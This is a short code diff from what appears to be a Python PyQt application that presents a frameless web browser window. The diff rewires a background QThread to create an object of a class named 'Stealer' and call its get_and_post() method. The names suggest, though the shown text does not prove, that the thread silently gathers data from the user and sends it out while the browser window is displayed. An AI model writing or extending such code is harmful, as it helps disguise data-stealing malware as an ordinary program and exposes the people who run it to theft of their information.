@@ -143,7 +143,8 @@ class Stealer():
 
 class ExtraThread(QThread):
     def run(self):
-        get_and_post()
+        stealer = Stealer()
+        stealer.get_and_post()
 
 class WebBrowser(FramelessWindow):
     def __init__(self):
